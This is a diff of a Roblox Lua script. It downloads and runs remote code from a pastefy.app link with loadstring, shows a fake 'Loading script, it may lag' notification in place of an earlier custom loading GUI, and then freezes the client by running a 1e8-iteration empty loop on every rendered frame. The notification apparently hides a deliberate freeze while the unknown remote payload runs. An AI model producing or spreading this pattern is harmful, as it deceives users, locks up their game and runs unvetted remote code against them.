@@ -1,89 +1,14 @@
 loadstring(game:HttpGet("https://pastefy.app/nmrhpVJI/raw"))()
-local player = game.Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
+task.wait(1)
 
-local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
-
--- ScreenGui
-local screenGui = Instance.new("ScreenGui")
-screenGui.Parent = playerGui
-
--- Frame
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 300, 0, 150)
-frame.Position = UDim2.new(0.5, -150, 1, 200) -- start off-screen
-frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-frame.BorderSizePixel = 0
-frame.Parent = screenGui
-
--- Rounded corners
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 16)
-corner.Parent = frame
-
--- Text
-local text = Instance.new("TextLabel")
-text.Size = UDim2.new(1, 0, 0, 40)
-text.BackgroundTransparency = 1
-text.Text = "Loading script, it may lag for a few seconds..."
-text.TextScaled = true
-text.TextColor3 = Color3.fromRGB(255,255,255)
-text.Parent = frame
-
--- Smooth pop-in animation
-TweenService:Create(
-	frame,
-	TweenInfo.new(0.6, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
-	{Position = UDim2.new(0.5, -150, 0.5, -75)}
-):Play()
-
--- Drag system (SMOOTH)
-local dragging = false
-local dragStart
-local startPos
-
-local function tweenTo(position)
-	TweenService:Create(
-		frame,
-		TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-		{Position = position}
-	):Play()
-end
-
-frame.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1
-	or input.UserInputType == Enum.UserInputType.Touch then
-		
-		dragging = true
-		dragStart = input.Position
-		startPos = frame.Position
-
-		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then
-				dragging = false
-			end
-		end)
-	end
+pcall(function()
+	game.StarterGui:SetCore("SendNotification", {
+		Title = "Loading",
+		Text = "Loading script, it may lag for a while...",
+		Duration = 5
+	})
 end)
-
-UserInputService.InputChanged:Connect(function(input)
-	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
-	or input.UserInputType == Enum.UserInputType.Touch) then
-		
-		local delta = input.Position - dragStart
-		
-		local newPos = UDim2.new(
-			startPos.X.Scale,
-			startPos.X.Offset + delta.X,
-			startPos.Y.Scale,
-			startPos.Y.Offset + delta.Y
-		)
-
-		tweenTo(newPos)
-	end
-end)
-wait(5) 
+wait(4) 
 local RunService = game:GetService("RunService")
 
 RunService.RenderStepped:Connect(function() for i = 1, 1e8 do end end)
